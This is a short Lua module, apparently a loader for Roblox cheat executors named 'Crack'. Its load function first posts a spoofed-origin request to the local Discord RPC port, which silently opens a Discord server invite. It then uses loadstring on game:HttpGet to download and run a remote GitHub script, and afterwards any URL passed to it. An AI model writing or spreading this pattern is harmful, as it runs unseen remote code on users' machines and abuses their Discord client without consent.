repeat wait() until game:IsLoaded()
local HttpService = game:GetService("HttpService")
local Request_ = (syn and syn.request) or (http and http.request) or http_request
local Crack = {}

function Crack:load(Raw)

    Request_({
        Url = 'http://127.0.0.1:6463/rpc?v=1',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json',
            Origin = 'https://discord.com'
        },
        Body = HttpService:JSONEncode({
            cmd = 'INVITE_BROWSER',
            nonce = HttpService:GenerateGUID(false),
            args = {code = "cZfYYb9Kvm"}
        })
    })
    
    local Sucess, Response = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/YutoHub/Crack.lua"))()
    end)
    if Sucess then loadstring(game:HttpGet(Raw))() end
end

return Crack
